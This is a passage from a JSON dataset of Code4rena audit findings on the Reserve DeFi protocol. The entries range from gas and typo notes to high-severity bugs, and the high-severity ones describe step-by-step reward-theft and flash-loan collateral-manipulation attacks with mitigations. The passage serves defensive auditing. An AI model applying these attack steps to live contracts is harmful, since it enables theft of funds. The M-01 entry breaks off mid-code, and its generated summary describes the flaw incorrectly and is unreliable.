      "content": "The following else block in the function logic of `refresh()` is never reachable considering [`tryPrice()`](https://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/Asset.sol#L64-L84) does not have (0, FIX\\_MAX) catered for. Any upriced data would have been sent to the catch block. Other than Asset.sol, similarly wasted logic is also exhibited in [`AppreciatingFiatCollateral.refresh`](https://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/AppreciatingFiatCollateral.sol#L113-L116), [`FiatCollateral.refresh`](https://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/FiatCollateral.sol#L136-L139), [`CTokenV3Collateral.refresh`](https://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/compoundv3/CTokenV3Collateral.sol#L105-L110), [`CurveStableCollateral.refresh`](https://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/curve/CurveStableCollateral.sol#L110-L115), [`StargatePoolFiatCollateral.refresh`](https://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/stargate/StargatePoolFiatCollateral.sol#L87-L90).  \n\nhttps://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/Asset.sol#L86-L106\n\n```solidity\n    /// Should not revert\n    /// Refresh saved prices\n    function refresh() public virtual override {\n        try this.tryPrice() returns (uint192 low, uint192 high, uint192) {\n            // {UoA/tok}, {UoA/tok}\n            // (0, 0) is a valid price; (0, FIX_MAX) is unpriced\n\n            // Save prices if priced\n            if (high < FIX_MAX) {\n                savedLowPrice = low;\n                savedHighPrice = high;\n                lastSave = uint48(block.timestamp);\n            } else {\n                // must be unpriced\n                assert(low == 0);\n            }\n        } catch (bytes memory errData) {\n            // see: docs/solidity-style.md#Catching-Empty-Data\n            if (errData.length == 0) revert(); // solhint-disable-line reason-string\n        }\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27379",
      "title": "[G-01] Immutable over constant",
      "impact": "GAS",
      "content": "The use of constant `keccak` variables results in extra hashing whenever the variable is used, increasing gas costs relative to just storing the output hash. Changing to immutable will only perform hashing on contract deployment which will save gas.\n\nHere are some of the instances entailed.\n\nhttps://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/aave/StaticATokenLM.sol#L44-L60\n\n```solidity\n    bytes public constant EIP712_REVISION = bytes(\"1\");\n    bytes32 internal constant EIP712_DOMAIN =\n        keccak256(\n            \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"\n        );\n    bytes32 public constant PERMIT_TYPEHASH =\n        keccak256(\n            \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"\n        );\n    bytes32 public constant METADEPOSIT_TYPEHASH =\n        keccak256(\n            \"Deposit(address depositor,address recipient,uint256 value,uint16 referralCode,bool fromUnderlying,uint256 nonce,uint256 deadline)\"\n        );\n    bytes32 public constant METAWITHDRAWAL_TYPEHASH =\n        keccak256(\n            \"Withdraw(address owner,address recipient,uint256 staticAmount,uint256 dynamicAmount,bool toUnderlying,uint256 nonce,uint256 deadline)\"\n        );\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27378",
      "title": "[N-02] Needless accrue for src",
      "impact": "LOW",
      "content": "We don't need to accrue for `src` because we don't use any information of `src` and that info will be accrued during the [underlyingComet transfer](https://github.com/compound-finance/comet/blob/main/contracts/Comet.sol#L942).\n\n- https://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/compoundv3/CusdcV3Wrapper.sol#L91\n\n```solidity\n    underlyingComet.accrueAccount(address(this));\n    underlyingComet.accrueAccount(src); //@audit needless accrue\n\n    CometInterface.UserBasic memory wrappedBasic = underlyingComet.userBasic(address(this));\n    int104 wrapperPrePrinc = wrappedBasic.principal;\n\n    IERC20(address(underlyingComet)).safeTransferFrom(src, address(this), amount); \n```\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27377",
      "title": "[N-01] Typo",
      "impact": "LOW",
      "content": "`_accumuatedRewards` => `_accumulatedRewards`\n\n- https://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/erc20/RewardableERC20.sol#L57\n\n```solidity\nuint256 _accumuatedRewards = accumulatedRewards[account];\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27376",
      "title": "[L-07] Typical first depositor issue in `RewardableERC4626Vault`",
      "impact": "LOW",
      "content": "It's recommended to follow the [instructions](https://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/vendor/oz/ERC4626.sol#L39-L43).\n\n- https://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/erc20/RewardableERC4626Vault.sol#L20\n\n```solidity\nabstract contract RewardableERC4626Vault is ERC4626, RewardableERC20 {}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27375",
      "title": "[L-06] Unsafe permission",
      "impact": "LOW",
      "content": "`WrappedERC20` uses a permission mechanism and operators can have an infinite allowance once approved. It might be inconvenient/dangerous for some users.\n\n- https://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/compoundv3/CusdcV3Wrapper.sol#L84\n\n```solidity\n    function _deposit(\n        address operator,\n        address src,\n        address dst,\n        uint256 amount\n    ) internal {\n        if (!hasPermission(src, operator)) revert Unauthorized(); //@audit infinite allowance\n        ...\n    }\n```\n\n- https://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/compoundv3/CusdcV3Wrapper.sol#L140\n\n```solidity\n    function _withdraw(\n        address operator,\n        address src,\n        address dst,\n        uint256 amount\n    ) internal {\n        if (!hasPermission(src, operator)) revert Unauthorized(); //@audit infinite allowance\n        ...\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27374",
      "title": "[L-05] Wrong comment",
      "impact": "LOW",
      "content": "- https://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/Asset.sol#L146\n\n```solidity\n// oracleTimeout <= delta <= oracleTimeout + priceTimeout ==========> oracleTimeout < delta < oracleTimeout + priceTimeout\n```\n\n- https://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/compoundv3/WrappedERC20.sol#L298\n\n```solidity\n     * - when `from` is zero, `amount` tokens will be minted for `to`. //@audit should remove, no hook if `from` or `to` is zero\n     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27373",
      "title": "[L-04] Reverts on 0 transfer",
      "impact": "LOW",
      "content": "It deposits 0 amount to the staking contract to claim rewards but it might revert [during the 0 transfer](https://github.com/stargate-protocol/stargate/blob/main/contracts/LPStaking.sol#L161). There is no problem with the current `lpToken` but good to keep in mind.\n\n- https://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/stargate/StargateRewardableWrapper.sol#L48\n\n```solidity\nstakingContract.deposit(poolId, 0);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27372",
      "title": "[L-03] Unsafe downcasting",
      "impact": "LOW",
      "content": "`feeds[i].length` might be downcasted wrongly when it's greater than `type(uint8).max`. `maxFeedsLength()` might pass the [requirement](https://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/curve/PoolTokens.sol#L105) when `config.feeds` has many elements(like 256).\n\n- https://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/curve/PoolTokens.sol#L330\n\n```solidity\nmaxLength = uint8(Math.max(maxLength, feeds[i].length));\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27371",
      "title": "[L-02] Possible reentrancy",
      "impact": "LOW",
      "content": "Users might manipulate `wrapperPostPrinc` inside the transfer hook. With the current `underlyingComet` token, there is no impact as it doesn't have any hook but it's recommended to add a `nonReentrant` modifier to `_deposit()/_withdraw()`.\n\n- https://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/compoundv3/CusdcV3Wrapper.sol#L96\n\n```solidity\nIERC20(address(underlyingComet)).safeTransferFrom(src, address(this), amount);\n```\n\n- https://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/compoundv3/CusdcV3Wrapper.sol#L154\n\n```solidity\nIERC20(address(underlyingComet)).safeTransfer(dst, (amount / 10) * 10);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27370",
      "title": "[L-01] Unsafe max approve",
      "impact": "LOW",
      "content": "It's not recommended to approve `type(uint256).max` for safety. We should approve a relevant amount every time.\n\n- https://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/aave/StaticATokenLM.sol#L105\n\n```solidity\nASSET.safeApprove(address(pool), type(uint256).max);\n```\n\n- https://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/stargate/StargateRewardableWrapper.sol#L39\n\n```solidity\npool_.approve(address(stakingContract_), type(uint256).max);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27369",
      "title": "[M-01] Curve Read-only Reentrancy can increase the price of some CurveStableCollateral",
      "impact": "MEDIUM",
      "content": "\nIf the curve pool of a CurveStableCollateral is a Plain Pool with a native gas token, just like eth/stETH pool: https://etherscan.io/address/0xdc24316b9ae028f1497c275eb9192a3ea0f67022#code<br>\nThe price can be manipulated by Curve Read-only Reentrancy.\n\nA example is eth/stETH pool, in its `remove_liquidity` function:\n```solidity\n",
      "summary": "\nThis bug report describes a vulnerability in the CurveStableCollateral. This is a type of pool with a native gas token, such as eth/stETH pool. The vulnerability is a type of attack called a Curve Read-only Reentrancy, which allows an attacker to manipulate the pool's price. \n\nThis attack works by exploiting a flaw in the `remove_liquidity` function of the pool. The code for this function looks like this:\n\n```solidity\n\nThis code allows an attacker to call the `remove_liquidity` function multiple times in a row, allowing them to manipulate the pool's price. This vulnerability can be exploited by anyone with access to the pool, and can be used to gain an unfair advantage over the other users of the pool.\n\nTo prevent this vulnerability, the code for the `remove_liquidity` function should be modified to prevent multiple calls to the function. Additionally, the pool should be monitored for suspicious activity, and any suspicious activity should be investigated and addressed immediately.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-07-reserve",
      "github_link": "https://github.com/code-423n4/2023-07-reserve-findings/issues/45",
      "tags": [],
      "finders": [
        "bin2chen",
        "ronnyx2017"
      ]
    },
    {
      "id": "27368",
      "title": "[H-03] ConvexStakingWrapper.sol after shutdown，rewards can be stolen",
      "impact": "HIGH",
      "content": "\nAfter shutdown, checkpoints are stopped, leading to possible theft of rewards.\n\n### Proof of Concept\n\n`ConvexStakingWrapper` No more `checkpoints` after `shutdown`, i.e. no updates `reward.reward_integral_for[user]`\n\n```solidity\n    function _beforeTokenTransfer(\n        address _from,\n        address _to,\n        uint256\n    ) internal override {\n@>      _checkpoint([_from, _to]);\n    }\n\n    function _checkpoint(address[2] memory _accounts) internal nonReentrant {\n        //if shutdown, no longer checkpoint in case there are problems\n@>      if (isShutdown()) return;\n\n        uint256 supply = _getTotalSupply();\n        uint256[2] memory depositedBalance;\n        depositedBalance[0] = _getDepositedBalance(_accounts[0]);\n        depositedBalance[1] = _getDepositedBalance(_accounts[1]);\n\n        IRewardStaking(convexPool).getReward(address(this), true);\n\n        _claimExtras();\n\n        uint256 rewardCount = rewards.length;\n        for (uint256 i = 0; i < rewardCount; i++) {\n            _calcRewardIntegral(i, _accounts, depositedBalance, supply, false);\n        }\n    }    \n```\n\nThis would result in, after `shutdown`, being able to steal `rewards` by transferring `tokens` to new users.\n\nExample:<br>\nSuppose the current<br>\n`reward.reward_integral = 1000`\n\nWhen a `shutdown` occurs:\n\n1.  Alice transfers 100 to the new user, Bob.\n\nSince Bob is the new user and `_beforeTokenTransfer()->_checkpoint()` is not actually executed.<br>\nResult:<br>\nbalanceOf\\[bob] = 100<br>\nreward.reward\\_integral\\_for\\[bob] = 0\n\n2.  Bob executes `claimRewards()` to steal the reward.\n\nreward amount = balanceOf\\[bob] &ast; (reward.reward\\_integral \\- reward.reward\\_integral\\_for\\[bob])<br>\n\\= 100 &ast; (1000-0)\n\n3. Bob transfers the balance to other new users, looping steps 1-2 and stealing all rewards.\n\n### Recommended Mitigation Steps\n\nStill execute `\\_checkpoint`\n\n```solidity\n\n    function _checkpoint(address[2] memory _accounts) internal nonReentrant {\n        //if shutdown, no longer checkpoint in case there are problems\n -      if (isShutdown()) return;\n\n        uint256 supply = _getTotalSupply();\n        uint256[2] memory depositedBalance;\n        depositedBalance[0] = _getDepositedBalance(_accounts[0]);\n        depositedBalance[1] = _getDepositedBalance(_accounts[1]);\n\n        IRewardStaking(convexPool).getReward(address(this), true);\n\n        _claimExtras();\n\n        uint256 rewardCount = rewards.length;\n        for (uint256 i = 0; i < rewardCount; i++) {\n            _calcRewardIntegral(i, _accounts, depositedBalance, supply, false);\n        }\n    }    \n```\n\n### Assessed type\n\nContext\n\n**[pmckelvy1 (Reserve) acknowledged](https://github.com/code-423n4/2023-07-reserve-findings/issues/11#issuecomment-1699523437)**\n\n**[Reserve Mitigated](https://github.com/code-423n4/2023-09-reserve-mitigation#individual-prs):**\n> Skip reward claim in `_checkpoint` if shutdown. <br>\n> PR: https://github.com/reserve-protocol/protocol/pull/930\n\n**Status:** Mitigation confirmed. Full details in reports from  [ronnyx2017](https://github.com/code-423n4/2023-09-reserve-mitigation-findings/issues/22), [bin2chen](https://github.com/code-423n4/2023-09-reserve-mitigation-findings/issues/5) and [RaymondFam](https://github.com/code-423n4/2023-09-reserve-mitigation-findings/issues/29).\n\n\n***\n\n \n",
      "summary": "\nThis bug report is about a vulnerability in the `ConvexStakingWrapper` code that could lead to theft of rewards. After a shutdown, the code does not execute the `_checkpoint` function which is responsible for updating the rewards integral for users. This means that if a user transfers tokens to a new user, the new user can use the `claimRewards` function to steal the rewards by taking advantage of the fact that the rewards integral has not been updated.\n\nThe recommended mitigation steps are to still execute the `_checkpoint` function even during shutdowns. The bug has been acknowledged by pmckelvy1 (Reserve) and the mitigation has been confirmed. Full details can be found in the reports from ronnyx2017, bin2chen and RaymondFam.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-07-reserve",
      "github_link": "https://github.com/code-423n4/2023-07-reserve-findings/issues/11",
      "tags": [],
      "finders": [
        "bin2chen"
      ]
    },
    {
      "id": "27367",
      "title": "[H-02] CurveVolatileCollateral Collateral status can be manipulated by flashloan attack",
      "impact": "HIGH",
      "content": "\nAttacker can make the CurveVolatileCollateral enter the status of IFFY/DISABLED. It will cause the basket to rebalance and sell off all the CurveVolatileCollateral.\n\n### Proof of Concept\n\nThe `CurveVolatileCollateral` overrides the `_anyDepeggedInPool` function to check if the distribution of capital is balanced. If the any part of underlying token exceeds the expected more than `_defaultThreshold`, return true, which means the volatile pool has been depeg:\n\n```solidity\nuint192 expected = FIX_ONE.divu(nTokens); // {1}\nfor (uint8 i = 0; i < nTokens; i++) {\n    uint192 observed = divuu(vals[i], valSum); // {1}\n    if (observed > expected) {\n        if (observed - expected > _defaultThreshold) return true;\n    }\n}\n```\n\nAnd the coll status will be updated in the super class `CurveStableCollateral.refresh()`:\n\n    if (low == 0 || _anyDepeggedInPool() || _anyDepeggedOutsidePool()) {\n        markStatus(CollateralStatus.IFFY);\n    }\n\nThe attack process is as follows:\n\n1.  Assumption: There is a CurveVolatileCollateral bases on a TriCrypto ETH/WBTC/USDT, and the value of them should be 1:1:1, and the `_defaultThreshold` of the CurveVolatileCollateral is 5%. And at first, there are 1000 USDT in the pool and the pool is balanced.\n\n2.  The attacker uses flash loan to deposit 500 USDT to the pool. Now, the USDT distribution is `1500/(1500+1000+1000) = 42.86%`.\n\n3.  Attacker refresh the CurveVolatileCollateral. Because the USDT distribution \\- expected = 42.86% \\- 33.33% = 9.53% > 5% \\_defaultThreshold. So CurveVolatileCollateral will be marked as IFFY.\n\n4.  The attacker withdraw from the pool and repay the USDT.\n\n5.  Just wait `delayUntilDefault`, the collateral will be marked as defaulted by the `alreadyDefaulted` function.\n\n        function alreadyDefaulted() internal view returns (bool) {\n            return _whenDefault <= block.timestamp;\n        }\n\n### Recommended Mitigation Steps\n\nI think the de-pegged status in the volatile pool may be unimportant. It will be temporary and have little impact on the price of outside lp tokens. After all, override the `_anyDepeggedOutsidePool` to check the lp price might be a good idea.\n\n### Assessed type\n\nContext\n\n**[tbrent (Reserve) confirmed](https://github.com/code-423n4/2023-07-reserve-findings/issues/22#issuecomment-1670210544)**\n\n**[Reserve Mitigated](https://github.com/code-423n4/2023-09-reserve-mitigation#individual-prs):**\n> Removes `CurveVolatileCollateral`.<br>\n> PR: https://github.com/reserve-protocol/protocol/pull/896\n\n**Status:** Mitigation confirmed. Full details in reports from  [ronnyx2017](https://github.com/code-423n4/2023-09-reserve-mitigation-findings/issues/21), [RaymondFam](https://github.com/code-423n4/2023-09-reserve-mitigation-findings/issues/27) and [bin2chen](https://github.com/code-423n4/2023-09-reserve-mitigation-findings/issues/4).\n\n***\n\n",
      "summary": "\nA bug was discovered in the CurveVolatileCollateral smart contract which allowed an attacker to make it enter the status of IFFY/DISABLED. This would cause the basket to rebalance and sell off all the CurveVolatileCollateral. \n\nThe bug was caused by the `_anyDepeggedInPool` function, which is used to check if the distribution of capital is balanced. If the any part of underlying token exceeds the expected more than `_defaultThreshold`, it would return true, which would then update the coll status in the super class `CurveStableCollateral.refresh()`.\n\nThe attack process was as follows: An assumption was made that there was a CurveVolatileCollateral bases on a TriCrypto ETH/WBTC/USDT, and the value of them should be 1:1:1, and the `_defaultThreshold` of the CurveVolatileCollateral was 5%. Then, an attacker used flash loan to deposit 500 USDT to the pool. This caused the USDT distribution to exceed the expected value, and when the CurveVolatileCollateral was refreshed, it was marked as IFFY. The attacker then withdrew from the pool and repaid the USDT. Finally, after a certain delay, the collateral would be marked as defaulted.\n\nTo mitigate this bug, the developers suggested that the de-pegged status in the volatile pool may be unimportant and that overriding the `_anyDepeggedOutsidePool` to check the lp price might be a good idea. The bug was confirmed and mitigated by tbrent (Reserve) and full details can be found in reports from  [ronnyx2017](https://github.com/code-423n4/2023-09-reserve-mitigation-findings/issues/21), [RaymondFam](https://github.com/code-423n4/2023-09-reserve-mitigation-findings/issues/27) and [bin2chen](https://github.com/code-423n4/2023-09-reserve-mitigation-findings/issues/4).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-07-reserve",
      "github_link": "https://github.com/code-423n4/2023-07-reserve-findings/issues/22",
      "tags": [
        "Flash Loan"
      ],
      "finders": [
        "ronnyx2017"
      ]
    },
    {
      "id": "27366",
      "title": "[H-01] CBEthCollateral and AnkrStakedEthCollateral \\_underlyingRefPerTok is incorrect",
      "impact": "HIGH",
      "content": "\n### Lines of Code\n\n<https://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/cbeth/CBETHCollateral.sol#L67-L69><br>\n<https://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/ankr/AnkrStakedEthCollateral.sol#L58-L61>\n\nThe `CBEthCollateral._underlyingRefPerTok()` function just uses `CBEth.exchangeRate()` to get the ref/tok rate. The `CBEth.exchangeRate()` can only get the conversion rate from cbETH to staked ETH2 on the coinbase. However as the docs `https://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/2023-07-reserve/protocol/contracts/plugins/assets/cbeth/README.md` the ref unit should be ETH. The staked ETH2 must take a few days to unstake, which leads to a premium between ETH and cbETH.\n\nAnd the `AnkrStakedEthCollateral` and `RethCollateral` has the same problem. According to the ankr docs, unstake eth by Flash unstake have to pay a fee, 0.5% of the unstaked amount. <https://www.ankr.com/docs/liquid-staking/eth/unstake/>\n\n### Impact\n\nThe `_underlyingRefPerTok` will return a higher ref/tok rate than the truth. And the premium is positively correlated with the unstake delay of eth2. When the unstake queue suddenly increases, the attacker can uses cbeth to issue more rtokens. Even if the cbETH has defaulted, the CBEthCollateral will never mark the state as DISABLED because the `CBEth.exchangeRate()` is updated by coinbase manager and it only represents the cbETH / staked eth2 rate instead of the cbETH/ETH rate.\n\n### Proof of Concept\n\nFor example, Now it's about 17819370 block high on the mainnet, and the `CBEth.exchangeRate()`(<https://etherscan.io/token/0xbe9895146f7af43049ca1c1ae358b0541ea49704#readProxyContract#F12>) is 1.045264058480813188, but the chainlink price feed for cbETH/ETH(<https://data.chain.link/ethereum/mainnet/crypto-eth/cbeth-eth>) is 1.0438.\n\n### Recommended Mitigation Steps\n\nUse the `cbETH/ETH` oracle to get the `cbETH/ETH` rate.\n\nOr, the ref unit for the collateral should be the staked eth2.\n\n### Assessed type\n\nContext\n\n**[tbrent (Reserve) commented](https://github.com/code-423n4/2023-07-reserve-findings/issues/23#issuecomment-1670254005):**\n > This feels like a duplicate of [#32](https://github.com/code-423n4/2023-07-reserve-findings/issues/32). The root cause is an incorrect reference unit. The reference unit should be staked eth2, as indicated here. \n\n**[pmckelvy1 (Reserve) confirmed](https://github.com/code-423n4/2023-07-reserve-findings/issues/23#issuecomment-1687102372)**\n\n**[ronnyx2017 (warden) commented](https://github.com/code-423n4/2023-07-reserve-findings/issues/23#issuecomment-1706448165):**\n > This issue and [32](https://github.com/code-423n4/2023-07-reserve-findings/issues/32) explain the misuse of tar unit and ref unit in staked eth related assets from different perspectives. The root cause is same, that 1 staked eth2 != 1 eth. This issue assumes that the ref token and target is all eth, which is referred to in [the docs](https://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/2023-07-reserve/protocol/contracts/plugins/assets/cbeth/README.md). So the error should be in the function `_underlyingRefPerTok`. But issue 32 assumes that the ref unit should be staked eth2 and the target unit is eth. So it needs to modify function `targetPerRef`. I also have mentioned this mitigation in the `Recommended Mitigation Steps` section of the current issue:\n> ```\n> Or, the ref unit for the collateral should be the staked eth2.\n> ```\n\n**[cccz (judge) increased severity to High](https://github.com/code-423n4/2023-07-reserve-findings/issues/23#issuecomment-1706659317)**\n\n**[Reserve Mitigated](https://github.com/code-423n4/2023-09-reserve-mitigation#individual-prs):**\n> Fixes units and price calculations in cbETH, rETH, ankrETH collateral plugins.<br>\n> PR: https://github.com/reserve-protocol/protocol/pull/899\n\n**Status**: Mitigation confirmed. Full details in reports from  [ronnyx2017](https://github.com/code-423n4/2023-09-reserve-mitigation-findings/issues/20), [bin2chen](https://github.com/code-423n4/2023-09-reserve-mitigation-findings/issues/3) and [RaymondFam](https://github.com/code-423n4/2023-09-reserve-mitigation-findings/issues/2).\n\n***\n\n",
      "summary": "\nThis bug report is about the misuse of the reference unit and target unit in staked ETH related assets. The root cause is that 1 staked ETH2 is not equal to 1 ETH. The `_underlyingRefPerTok` function uses `CBEth.exchangeRate()` to get the ref/tok rate, which only gets the conversion rate from cbETH to staked ETH2 on the coinbase. This leads to a higher ref/tok rate than the truth. The attacker can use cbETH to issue more rtokens, which can cause a premium between ETH and cbETH.\n\nTo mitigate this issue, the `cbETH/ETH` oracle should be used to get the `cbETH/ETH` rate. Alternatively, the ref unit for the collateral should be the staked ETH2. Reserve Protocol has already fixed the units and price calculations in cbETH, rETH, and ankrETH collateral plugins. Mitigation reports have been provided by ronnyx2017, bin2chen, and RaymondFam.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-07-reserve",
      "github_link": "https://github.com/code-423n4/2023-07-reserve-findings/issues/23",
      "tags": [],
      "finders": [
        "0xA5DF",
        "ronnyx2017"
      ]
    },
    {
      "id": "27365",
      "title": "[G-12] Use custom errors instead of string errors",
      "impact": "GAS",
      "content": "This saves gas both for deployment and in case that the revert is triggered.\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27364",
      "title": "[G-11] `quoteCustomRedemption()` loop",
      "impact": "GAS",
      "content": "### `nonce`\nSavings: `100*basketNonces.length`<br>\n[Here](https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/BasketHandler.sol#L398) nonce is being read each iteration.\nIt can be cached outside of the loop.\n\n### `basketNonces.length`\nSavings: `100*basketNonces.length`\n\n### `b.erc20s.length`\nSavings: `100*(sum of `b.erc20s.length` for all baskets)`\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27363",
      "title": "[G-10]`sellAmount` at `DutchTrade.settle()`",
      "impact": "GAS",
      "content": "`sellAmount` is read here twice if greater than `sellBal`\n```solidity\n        soldAmt = sellAmount > sellBal ? sellAmount - sellBal : 0;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27362",
      "title": "[G-09] `BasketLib.nextBasket()` caching",
      "impact": "GAS",
      "content": "On top of the above refactoring:\n* `config.erc20s[i]` is being read a few times [here](https://github.com/reserve-protocol/protocol/blob/c4ec2473bbcb4831d62af55d275368e73e16b984/contracts/p1/mixins/BasketLib.sol#L193-L224)\n* `config.erc20s.length` and `backup.erc20s.length` can be cached\n* `targetNames.at(i)` is  being read twice in the second loop (3 before the proposed refactoring)\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-06-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27361",
